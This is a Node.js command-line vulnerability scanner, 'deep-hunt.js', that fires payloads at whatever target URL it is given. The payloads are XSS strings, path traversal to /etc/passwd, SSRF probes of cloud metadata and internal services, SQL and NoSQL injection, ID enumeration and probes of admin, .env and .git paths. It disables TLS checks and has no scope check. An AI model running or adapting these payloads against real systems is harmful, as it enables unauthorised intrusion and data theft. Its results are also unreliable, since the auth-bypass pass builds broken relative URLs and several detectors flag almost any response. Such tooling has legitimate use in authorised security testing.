#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');
const { URL } = require('url');

const MAX_URL_LENGTH = 8192;

/**
 * @typedef {Object} DeepHuntOptions
 * @property {string} target - Target URL base
 * @property {string[]} [endpoints] - Specific endpoints to test
 * @property {string} [cookies] - Session cookies
 * @property {Object} [headers] - Custom headers
 * @property {string} [output] - Output file path
 * @property {number} [threads=5] - Concurrent threads
 * @property {number} [timeout=10000] - Request timeout in ms
 * @property {boolean} [silent=false] - Suppress verbose output
 */

class DeepHunter {
  constructor(options = {}) {
    this.target = options.target ? options.target.replace(/\/+$/, '') : '';
    this.endpointList = options.endpoints || [];
    this.cookieStr = options.cookies || '';
    this.customHeaders = options.headers || {};
    this.threads = Math.min(options.threads || 5, 20);
    this.timeout = options.timeout || 10000;
    this.silent = options.silent || false;
    this.userAgent = 'Hercules-Hunt-Deep-Hunter/1.0';
    this.findings = [];
    this.requestLog = [];
    this.idorTestIds = ['1', '2', '3', '100', '1000', '999999', '-1', '0', 'null', 'undefined', 'admin', 'me', 'current'];
    this.xssPayloads = [
      '<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
      '"><script>alert(1)</script>', '"><img src=x onerror=alert(1)>',
      '{{constructor.constructor("alert(1)")()}}', '${alert(1)}',
      'javascript:alert(1)', '\'-alert(1)-\'', '\\";alert(1);//',
    ];
    this.pathTraversalPayloads = [
      '../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
      '....//....//....//etc/passwd',
      '../../../etc/passwd%00', '..;/..;/..;/etc/passwd',
    ];
    this.ssrfCallbackPatterns = [
      'http://localhost:80', 'http://127.0.0.1:80', 'http://[::1]:80',
      'http://0.0.0.0:80', 'http://metadata.google.internal',
      'http://169.254.169.254/', 'http://localhost:8080',
      'file:///etc/passwd', 'dict://localhost:11211/',
      'gopher://localhost:6379/',
    ];
    this.noSqlPayloads = [
      '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}', '{"$where": "1==1"}',
      '{"$exists": true}', 'null', '1', '{"$ne": 1}',
    ];
    this.sqlErrorPatterns = [
      'sql', 'mysql', 'sqlite', 'postgresql', 'ora-', 'microsoft ole db',
      'unclosed quotation', 'syntax error', 'odbc', 'driver error',
      'warning: mysql', 'division by zero', 'column not found',
    ];
    this.detectAuthBypassPaths = [
      '/admin', '/admin/', '/administrator', '/wp-admin', '/dashboard',
      '/api/admin', '/api/users', '/api/config', '/api/settings',
      '/.env', '/.git/config', '/config.json', '/debug', '/api/debug',
      '/swagger.json', '/api/swagger.json', '/api-docs', '/graphql',
    ];
  }

  /**
   * Logs to stderr if not silent
   * @param {string} msg
   * @param {string} [level='info']
   */
  log(msg, level = 'info') {
    if (!this.silent) process.stderr.write(`[${level.toUpperCase()}] ${msg}\n`);
  }

  /**
   * Builds headers object with optional cookies
   * @param {Object} [extra]
   * @returns {Object}
   */
  buildHeaders(extra = {}) {
    return {
      'User-Agent': this.userAgent,
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      ...this.customHeaders,
      ...(this.cookieStr ? { Cookie: this.cookieStr } : {}),
      ...extra,
    };
  }

  /**
   * Sends an HTTP request
   * @param {string} url
   * @param {string} [method='GET']
   * @param {Object} [opts={}]
   * @returns {Promise<{status: number, headers: Object, body: string, elapsed: number}>}
   */
  async request(url, method = 'GET', opts = {}) {
    const parsed = new URL(url);
    const isHttps = parsed.protocol === 'https:';
    const lib = isHttps ? https : http;
    const headers = this.buildHeaders(opts.headers || {});
    const body = opts.body || null;
    if (body && !headers['Content-Type']) {
      headers['Content-Type'] = typeof body === 'object' ? 'application/json' : 'application/x-www-form-urlencoded';
    }
    return new Promise((resolve) => {
      const reqOpts = {
        hostname: parsed.hostname,
        port: parsed.port || (isHttps ? 443 : 80),
        path: parsed.pathname + parsed.search,
        method: method.toUpperCase(),
        headers,
        timeout: opts.timeout || this.timeout,
        rejectUnauthorized: false,
      };
      const start = Date.now();
      const req = lib.request(reqOpts, (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          const bodyStr = Buffer.concat(chunks).toString();
          this.requestLog.push({
            url, method, status: res.statusCode, elapsed: Date.now() - start,
          });
          resolve({
            status: res.statusCode,
            headers: res.headers,
            body: bodyStr,
            bodyLength: bodyStr.length,
            elapsed: Date.now() - start,
          });
        });
      });
      req.on('timeout', () => { req.destroy(); resolve({ status: 0, headers: {}, body: '', bodyLength: 0, elapsed: Date.now() - start, error: 'timeout' }); });
      req.on('error', (e) => resolve({ status: 0, headers: {}, body: '', bodyLength: 0, elapsed: Date.now() - start, error: e.message }));
      if (body) {
        req.write(typeof body === 'object' ? JSON.stringify(body) : body);
      }
      req.end();
    });
  }

  /**
   * Tests IDOR by iterating through reference IDs
   * @param {string} endpoint
   * @returns {Promise<Array>}
   */
  async testIdor(endpoint) {
    const findings = [];
    const baseUrl = `${this.target}${endpoint}`;
    const hasIdPlaceholder = /\{id\}|:id|\d+/.test(endpoint);
    const baseline = await this.getBaseline(endpoint);
    for (const testId of this.idorTestIds) {
      const testUrl = hasIdPlaceholder
        ? baseUrl.replace(/\{id\}|:id/, testId).replace(/\/(\d+)(\/|$)/, `/${testId}$2`)
        : `${baseUrl.replace(/\/+$/, '')}/${testId}`;
      try {
        const res = await this.request(testUrl);
        if (res.status === 200) {
          const isDifferent = baseline ? Math.abs(res.bodyLength - baseline.bodyLength) > 50 : true;
          if (isDifferent && !res.body.includes('not found') && !res.body.includes('error') && !res.body.includes('404')) {
            findings.push({
              type: 'IDOR',
              endpoint: testUrl,
              method: 'GET',
              statusCode: res.status,
              bodyLength: res.bodyLength,
              testValue: testId,
              severity: 'high',
              evidence: res.body.slice(0, 300),
            });
          }
        }
      } catch { /* skip failures */ }
    }
    return findings;
  }

  /**
   * Gets a baseline response for comparison
   * @param {string} endpoint
   * @returns {Promise<{status: number, bodyLength: number}|null>}
   */
  async getBaseline(endpoint) {
    try {
      const url = `${this.target}${endpoint}`;
      const res = await this.request(url, 'GET');
      if (res.status === 200) {
        return { status: res.status, bodyLength: res.bodyLength };
      }
    } catch { /* ignore */ }
    return null;
  }

  /**
   * Tests XSS by injecting payloads into query parameters
   * @param {string} endpoint
   * @param {string} [param='q']
   * @returns {Promise<Array>}
   */
  async testXss(endpoint, param = 'q') {
    const findings = [];
    for (const payload of this.xssPayloads) {
      const encoded = encodeURIComponent(payload);
      const testUrl = `${this.target}${endpoint}${endpoint.includes('?') ? '&' : '?'}${param}=${encoded}`;
      try {
        const res = await this.request(testUrl);
        if (res.body.includes(payload.replace(/"/g, '&quot;')) ||
            res.body.includes(payload) ||
            /<script>|<img|<svg|onerror=|onload=|alert\(/i.test(res.body)) {
          findings.push({
            type: 'XSS',
            endpoint: testUrl,
            method: 'GET',
            statusCode: res.status,
            payload,
            severity: 'high',
            evidence: res.body.slice(0, 300),
          });
        }
      } catch { /* skip failures */ }
    }
    return findings;
  }

  /**
   * Tests SSRF by injecting callback URLs
   * @param {string} endpoint
   * @param {string} [param='url']
   * @returns {Promise<Array>}
   */
  async testSsrf(endpoint, param = 'url') {
    const findings = [];
    for (const callbackUrl of this.ssrfCallbackPatterns) {
      const encoded = encodeURIComponent(callbackUrl);
      const testUrl = `${this.target}${endpoint}${endpoint.includes('?') ? '&' : '?'}${param}=${encoded}`;
      try {
        const res = await this.request(testUrl);
        const timingDelta = res.elapsed > 3000;
        if (res.status !== 400 && res.status !== 403 && res.status !== 404) {
          findings.push({
            type: 'SSRF',
            endpoint: testUrl,
            method: 'GET',
            statusCode: res.status,
            payload: callbackUrl,
            elapsed: res.elapsed,
            timingAnomaly: timingDelta,
            severity: 'critical',
            evidence: `Status: ${res.status}, Body length: ${res.bodyLength}, Elapsed: ${res.elapsed}ms`,
          });
        }
      } catch { /* skip */ }
    }
    return findings;
  }

  /**
   * Tests path traversal
   * @param {string} endpoint
   * @param {string} [param='file']
   * @returns {Promise<Array>}
   */
  async testPathTraversal(endpoint, param = 'file') {
    const findings = [];
    for (const payload of this.pathTraversalPayloads) {
      const testUrl = `${this.target}${endpoint}${endpoint.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
      try {
        const res = await this.request(testUrl);
        if (res.body.includes('root:') || res.body.includes('root:x:') ||
            res.body.includes('[extensions]') || res.body.includes('; for 16-bit app support') ||
            res.body.includes('boot loader') || res.status === 200 && res.bodyLength > 100) {
          findings.push({
            type: 'Path Traversal',
            endpoint: testUrl,
            method: 'GET',
            statusCode: res.status,
            payload,
            severity: 'critical',
            evidence: res.body.slice(0, 300),
          });
        }
      } catch { /* skip */ }
    }
    return findings;
  }

  /**
   * Tests auth bypass via common paths
   * @param {string} baseUrl
   * @returns {Promise<Array>}
   */
  async testAuthBypass(baseUrl) {
    const findings = [];
    for (const path of this.detectAuthBypassPaths) {
      const testUrl = `${baseUrl}${path}`;
      try {
        const res = await this.request(testUrl);
        if (res.status === 200 && res.bodyLength > 50) {
          const noAuth = !res.headers['www-authenticate'] && !res.headers['set-cookie'];
          if (noAuth) {
            findings.push({
              type: 'Auth Bypass',
              endpoint: testUrl,
              method: 'GET',
              statusCode: res.status,
              bodyLength: res.bodyLength,
              severity: 'critical',
              evidence: `Status: ${res.status}, Size: ${res.bodyLength}, No auth required`,
            });
          }
        }
      } catch { /* skip */ }
    }
    return findings;
  }

  /**
   * Tests for SQL injection
   * @param {string} endpoint
   * @param {string} [param='id']
   * @returns {Promise<Array>}
   */
  async testSqlInjection(endpoint, param = 'id') {
    const findings = [];
    const sqliPayloads = [
      "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--", "' UNION SELECT NULL--",
      "' UNION SELECT 1,2,3--", "' AND 1=1--", "' AND 1=2--",
      "1' ORDER BY 1--", "1' ORDER BY 10--", "1' AND SLEEP(5)--",
      "1' WAITFOR DELAY '00:00:05'--", "1' AND 1=(SELECT 1 FROM information_schema.tables)--",
    ];
    const baseline = await this.request(`${this.target}${endpoint}${endpoint.includes('?') ? '&' : '?'}${param}=1`);
    for (const payload of sqliPayloads) {
      const testUrl = `${this.target}${endpoint}${endpoint.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
      try {
        const res = await this.request(testUrl);
        const timingDelta = Math.abs(res.elapsed - baseline.elapsed) > 3000;
        const hasError = this.sqlErrorPatterns.some((p) => res.body.toLowerCase().includes(p));
        const sizeDelta = Math.abs(res.bodyLength - baseline.bodyLength);
        if (hasError || timingDelta || (res.status === 200 && sizeDelta > 200)) {
          findings.push({
            type: 'SQL Injection',
            endpoint: testUrl,
            method: 'GET',
            statusCode: res.status,
            payload,
            timingAnomaly: timingDelta,
            sizeDelta,
            hasSQLError: hasError,
            severity: 'critical',
            evidence: res.body.slice(0, 300),
          });
        }
      } catch { /* skip */ }
    }
    return findings;
  }

  /**
   * Tests NoSQL injection
   * @param {string} endpoint
   * @param {string} [param='id']
   * @returns {Promise<Array>}
   */
  async testNoSqlInjection(endpoint, param = 'id') {
    const findings = [];
    const baseline = await this.request(`${this.target}${endpoint}${endpoint.includes('?') ? '&' : '?'}${param}=1`);
    for (const payload of this.noSqlPayloads) {
      const testUrl = `${this.target}${endpoint}`;
      try {
        const res = await this.request(testUrl, 'POST', {
          body: { [param]: typeof payload === 'string' ? JSON.parse(payload) : payload },
          headers: { 'Content-Type': 'application/json' },
        });
        const sizeDelta = Math.abs(res.bodyLength - (baseline?.bodyLength || 0));
        if (res.status === 200 && sizeDelta > 100) {
          findings.push({
            type: 'NoSQL Injection',
            endpoint: testUrl,
            method: 'POST',
            statusCode: res.status,
            payload,
            sizeDelta,
            severity: 'high',
            evidence: res.body.slice(0, 300),
          });
        }
      } catch { /* skip */ }
    }
    return findings;
  }

  /**
   * Tests HTTP method tampering
   * @param {string} endpoint
   * @returns {Promise<Array>}
   */
  async testMethodTampering(endpoint) {
    const findings = [];
    const methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT'];
    for (const method of methods) {
      try {
        const url = `${this.target}${endpoint}`;
        const res = await this.request(url, method);
        if (res.status === 200 && method !== 'GET') {
          findings.push({
            type: 'Method Tampering',
            endpoint: url,
            method,
            statusCode: res.status,
            severity: 'medium',
            evidence: `Method ${method} returned ${res.status} on ${url}`,
          });
        }
      } catch { /* skip */ }
    }
    return findings;
  }

  /**
   * Tests for information disclosure
   * @param {string} endpoint
   * @returns {Promise<Array>}
   */
  async testInfoDisclosure(endpoint) {
    const findings = [];
    const debugPatterns = ['debug', 'test', 'internal', 'stack', 'trace', 'error', 'exception'];
    const url = `${this.target}${endpoint}`;
    try {
      const res = await this.request(url);
      for (const pattern of debugPatterns) {
        if (res.body.toLowerCase().includes(pattern) && res.status === 200) {
          findings.push({
            type: 'Information Disclosure',
            endpoint: url,
            method: 'GET',
            statusCode: res.status,
            pattern,
            severity: 'medium',
            evidence: res.body.slice(0, 300),
          });
          break;
        }
      }
      const stackRegex = /at\s+\S+\s+\(.+:\d+:\d+\)|Error:\s|stack:\s|Traceback|in\s+\w+\.php|on\s+line\s+\d+/gi;
      if (stackRegex.test(res.body)) {
        findings.push({
          type: 'Stack Trace Leak',
          endpoint: url,
          method: 'GET',
          statusCode: res.status,
          severity: 'high',
          evidence: res.body.slice(0, 300),
        });
      }
    } catch { /* skip */ }
    return findings;
  }

  /**
   * Runs a single endpoint through all test passes
   * @param {string} endpoint
   * @returns {Promise<Array>}
   */
  async testEndpoint(endpoint) {
    this.log(`Testing endpoint: ${endpoint}`);
    const allFindings = [];
    try {
      const idor = await this.testIdor(endpoint);
      allFindings.push(...idor);
      const xss = await this.testXss(endpoint);
      allFindings.push(...xss);
      const ssrf = await this.testSsrf(endpoint);
      allFindings.push(...ssrf);
      const traversal = await this.testPathTraversal(endpoint);
      allFindings.push(...traversal);
      const sqli = await this.testSqlInjection(endpoint);
      allFindings.push(...sqli);
      const nosqli = await this.testNoSqlInjection(endpoint);
      allFindings.push(...nosqli);
      const methods = await this.testMethodTampering(endpoint);
      allFindings.push(...methods);
      const info = await this.testInfoDisclosure(endpoint);
      allFindings.push(...info);
    } catch (err) {
      this.log(`Error testing ${endpoint}: ${err.message}`, 'error');
    }
    return allFindings;
  }

  /**
   * Processes endpoints in batches with concurrency control
   * @param {string[]} endpoints
   * @returns {Promise<Array>}
   */
  async processBatch(endpoints) {
    const all = [];
    for (let i = 0; i < endpoints.length; i += this.threads) {
      const batch = endpoints.slice(i, i + this.threads);
      this.log(`Processing batch ${Math.floor(i / this.threads) + 1}/${Math.ceil(endpoints.length / this.threads)}`);
      const results = await Promise.all(batch.map((ep) => this.testEndpoint(ep)));
      for (const r of results) {
        all.push(...r);
      }
    }
    return all;
  }

  /**
   * Generates final report
   * @param {Array} findings
   * @param {Object} metadata
   * @returns {Object}
   */
  generateReport(findings, metadata = {}) {
    const byType = {};
    const bySeverity = {};
    for (const f of findings) {
      if (!byType[f.type]) byType[f.type] = [];
      byType[f.type].push(f);
      if (!bySeverity[f.severity]) bySeverity[f.severity] = [];
      bySeverity[f.severity].push(f);
    }
    const uniqueEndpoints = [...new Set(findings.map((f) => f.endpoint))];
    return {
      metadata: {
        tool: 'deep-hunt.js',
        timestamp: new Date().toISOString(),
        target: this.target,
        endpointsTested: this.endpointList.length,
        ...metadata,
      },
      summary: {
        totalFindings: findings.length,
        uniqueEndpointsWithIssues: uniqueEndpoints.length,
        critical: (bySeverity.critical || []).length,
        high: (bySeverity.high || []).length,
        medium: (bySeverity.medium || []).length,
        low: (bySeverity.low || []).length,
        byType: Object.fromEntries(Object.entries(byType).map(([k, v]) => [k, v.length])),
      },
      findings: findings.sort((a, b) => {
        const order = { critical: 0, high: 1, medium: 2, low: 3 };
        return (order[a.severity] || 99) - (order[b.severity] || 99);
      }),
      byType,
      bySeverity,
    };
  }

  /**
   * Runs the full hunt pipeline
   * @param {DeepHuntOptions} options
   * @returns {Promise<Object>}
   */
  async run(options) {
    const startTime = Date.now();
    if (options.target && typeof options.target === 'string') {
      if (options.target.trim().length === 0) throw new Error('Target must not be empty');
      if (options.target.length > MAX_URL_LENGTH) throw new Error(`Target URL exceeds maximum length of ${MAX_URL_LENGTH} characters`);
      this.target = options.target.replace(/\/+$/, '');
    }
    if (options.endpoints) this.endpointList = options.endpoints;
    if (options.cookies) this.cookieStr = options.cookies;
    if (options.timeout) this.timeout = options.timeout;
    if (options.silent !== undefined) this.silent = options.silent;

    if (!this.target) throw new Error('--target is required');
    if (this.endpointList.length === 0) {
      this.log('No endpoints specified, using auth bypass scan only', 'warn');
    }

    let allFindings = [];
    if (this.endpointList.length > 0) {
      allFindings = await this.processBatch(this.endpointList);
    }
    const authBypassFindings = [];
    const testedAuthPaths = new Set();
    for (const path of this.detectAuthBypassPaths) {
      if (!testedAuthPaths.has(path)) {
        testedAuthPaths.add(path);
        const results = await this.testAuthBypass(path);
        authBypassFindings.push(...results);
      }
    }
    allFindings.push(...authBypassFindings);

    const report = this.generateReport(allFindings, { elapsed: Date.now() - startTime });
    if (options.output) {
      const outPath = path.resolve(options.output);
      if (!outPath.startsWith(process.cwd())) {
        console.error('Path traversal detected:', options.output);
        process.exit(1);
      }
      fs.mkdirSync(path.dirname(outPath), { recursive: true });
      fs.writeFileSync(outPath, JSON.stringify(report, null, 2));
      this.log(`Report written to ${outPath}`);
    }
    return report;
  }
}

/**
 * Parses CLI arguments
 * @returns {DeepHuntOptions}
 */
function parseArgs() {
  const args = process.argv.slice(2);
  const options = { threads: 5, timeout: 10000, silent: false };
  for (let i = 0; i < args.length; i++) {
    switch (args[i]) {
      case '--target':
        options.target = args[++i];
        break;
      case '--endpoints':
        options.endpoints = args[++i].split(',').map((s) => s.trim()).filter(Boolean);
        break;
      case '--cookies':
        options.cookies = args[++i];
        break;
      case '--headers': {
        const h = args[++i];
        options.headers = {};
        h.split(',').forEach((pair) => {
          const [k, ...v] = pair.split(':');
          if (k && v.length) options.headers[k.trim()] = v.join(':').trim();
        });
        break;
      }
      case '--output':
        options.output = args[++i];
        break;
      case '--threads':
        options.threads = Math.min(parseInt(args[++i], 10) || 5, 20);
        break;
      case '--timeout':
        options.timeout = parseInt(args[++i], 10) || 10000;
        break;
      case '--silent':
        options.silent = true;
        break;
      case '--help':
      case '-h':
        printHelp();
        process.exit(0);
      default:
        if (args[i].startsWith('-')) {
          process.stderr.write(`Unknown option: ${args[i]}\n`);
          printHelp();
          process.exit(1);
        }
        if (!options.target) options.target = args[i];
    }
  }
  if (!options.target) {
    process.stderr.write('Error: --target is required\n');
    printHelp();
    process.exit(1);
  }
  return options;
}

/**
 * Prints help text
 */
function printHelp() {
  const help = `
Deep Systematic Hunter - deep-hunt.js
Multi-pass vulnerability testing across discovered endpoints.

USAGE:
  node deep-hunt.js --target <url> [options]
  node deep-hunt.js --target <url> --endpoints "/api/users,/api/items"

OPTIONS:
  --target <url>         Target base URL
  --endpoints <list>     Comma-separated specific endpoints to test
  --cookies <str>        Session cookies for authenticated testing
  --headers <str>        Custom headers (e.g. "X-Custom:value,Authorization:Bearer x")
  --output <path>        Write findings to JSON file
  --threads <number>     Concurrent threads (default: 5, max: 20)
  --timeout <ms>         Request timeout in ms (default: 10000)
  --silent               Suppress verbose output
  --help, -h             Show this help message

TEST PASSES:
  IDOR                - Iterates reference IDs to find access control flaws
  XSS                 - Injects script payloads into parameters
  SSRF                - Probes URL parameters with internal addresses
  Path Traversal      - Tests directory traversal payloads
  SQL Injection       - Injects SQL payloads, checks for errors/timing
  NoSQL Injection     - Tests MongoDB operators ($ne, $gt, etc.)
  Method Tampering    - Probes all HTTP methods on endpoints
  Info Disclosure     - Checks for stack traces and debug info
  Auth Bypass         - Probes common admin/debug paths

EXAMPLES:
  node deep-hunt.js --target https://api.example.com --endpoints "/api/users,/api/items" --output findings.json
  node deep-hunt.js --target https://app.example.com --cookies "session=abc123" --threads 10
  node deep-hunt.js --target https://example.com --silent > report.json
`;
  process.stderr.write(help);
}

/**
 * Main
 */
async function main() {
  try {
    const options = parseArgs();
    const hunter = new DeepHunter(options);
    const report = await hunter.run(options);
    process.stdout.write(JSON.stringify(report, null, 2) + '\n');
    process.exit(0);
  } catch (err) {
    process.stderr.write(`FATAL ERROR: ${err.message}\n`);
    process.exit(1);
  }
}

if (require.main === module) {
  main();
}

module.exports = { DeepHunter };
